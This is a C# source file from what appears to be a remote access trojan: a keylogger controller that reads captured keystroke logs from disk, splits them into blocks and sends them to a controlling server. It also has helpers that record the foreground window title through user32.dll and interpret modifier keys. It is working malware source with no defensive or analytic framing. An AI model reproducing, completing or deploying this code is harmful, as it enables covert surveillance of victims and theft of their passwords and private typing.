using Client.Controllers.Tools;
using Client.Packets.ClientPackets;
using Client.Packets.ServerPackets;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Client.Controllers
{
    public static class KeyLoggerController
    {
        public static void getKeyLogger(GetKeyLoggerLogs packet, ClientMosaic client)
        {
            new Thread(() =>
            {
                try
                {
                    int index = 1;

                    if (!Directory.Exists(Keylogger.LogDirectory))
                    {
                        new GetKeyLoggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    FileInfo[] iFiles = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();

                    if(iFiles.Length == 0)
                    {
                        new GetKeyLoggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    foreach(FileInfo file in iFiles)
                    {
                        FileSplit srcFile = new FileSplit(file.FullName);

                        if(srcFile.MaxBlocks < 0)
                        {
                            new GetKeyLoggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
                        }

                        for(int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            byte[] block;
                            if(srcFile.ReadBlock(currentBlock, out block))
                            {
                                new GetKeyLoggerLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
                            }
                            else
                            {
                                new GetKeyLoggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
                            }
                        }
                        index++;
                    }
                }
                catch (Exception ex)
                {
                    new GetKeyLoggerLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
                }
            }).Start();
        }

        #region "Extension Methods"
        public static bool IsModifierKeysSet(this List<Keys> pressedKeys)
        {
            return pressedKeys != null &&
                (pressedKeys.Contains(Keys.LControlKey)
                || pressedKeys.Contains(Keys.RControlKey)
                || pressedKeys.Contains(Keys.LMenu)
                || pressedKeys.Contains(Keys.RMenu)
                || pressedKeys.Contains(Keys.LWin)
                || pressedKeys.Contains(Keys.RWin)
                || pressedKeys.Contains(Keys.Control)
                || pressedKeys.Contains(Keys.Alt));
        }

        public static bool IsModifierKey(this Keys key)
        {
            return (key == Keys.LControlKey
                || key == Keys.RControlKey
                || key == Keys.LMenu
                || key == Keys.RMenu
                || key == Keys.LWin
                || key == Keys.RWin
                || key == Keys.Control
                || key == Keys.Alt);
        }

        public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c)
        {
            return pressedKeys.Contains((Keys)char.ToUpper(c));
        }

        public static bool IsExcludedKey(this Keys k)
        {
            // The keys below are excluded. If it is one of the keys below,
            // the KeyPress event will handle these characters. If the keys
            // are not any of those specified below, we can continue.
            return (k >= Keys.A && k <= Keys.Z
                      || k >= Keys.NumPad0 && k <= Keys.Divide
                      || k >= Keys.D0 && k <= Keys.D9
                      || k >= Keys.Oem1 && k <= Keys.OemClear
                      || k >= Keys.LShiftKey && k <= Keys.RShiftKey
                      || k == Keys.CapsLock
                      || k == Keys.Space);
        }
        #endregion

        public static bool DetectKeyHolding(List<char> list, char search)
        {
            return list.FindAll(s => s.Equals(search)).Count > 1;
        }

        public static string Filter(char key)
        {
            if ((int)key < 32) return string.Empty;

            switch (key)
            {
                case '<':
                    return "&lt;";
                case '>':
                    return "&gt;";
                case '#':
                    return "&#35;";
                case '&':
                    return "&amp;";
                case '"':
                    return "&quot;";
                case '\'':
                    return "&apos;";
                case ' ':
                    return "&nbsp;";
            }
            return key.ToString();
        }

        public static string Filter(string input)
        {
            return input.Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;").Replace("'", "&apos;");
        }

        public static string GetDisplayName(Keys key, bool altGr = false)
        {
            string name = key.ToString();
            if (name.Contains("ControlKey"))
                return "Control";
            else if (name.Contains("Menu"))
                return "Alt";
            else if (name.Contains("Win"))
                return "Win";
            else if (name.Contains("Shift"))
                return "Shift";
            return name;
        }

        public static string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            GetWindowText(GetForegroundWindow(), sbTitle,
                sbTitle.Capacity);

            string title = sbTitle.ToString();

            return (!string.IsNullOrEmpty(title)) ? title : null;
        }

        /// <summary>
        /// Appends text to a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        /// <param name="appendText">The text to append.</param>
        public static void WriteLogFile(string filename, string appendText)
        {
            appendText = ReadLogFile(filename) + appendText;

            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
            {
                byte[] data = Encoding.UTF8.GetBytes(appendText); // AES SUPPRIME
                fStream.Seek(0, SeekOrigin.Begin);
                fStream.Write(data, 0, data.Length);
            }
        }

        /// <summary>
        /// Reads a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        public static string ReadLogFile(string filename)
        {
            return File.Exists(filename) ? Encoding.UTF8.GetString(File.ReadAllBytes(filename)) : string.Empty; // AES SUPPRIME
        }

        /// <summary>
        ///     Retrieves a handle to the foreground window (the window with which the user is currently working).
        ///     The system assigns a slightly higher priority to the thread that creates the foreground window than it does to
        ///     other threads.
        /// </summary>
        /// <returns></returns>
        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    }
}
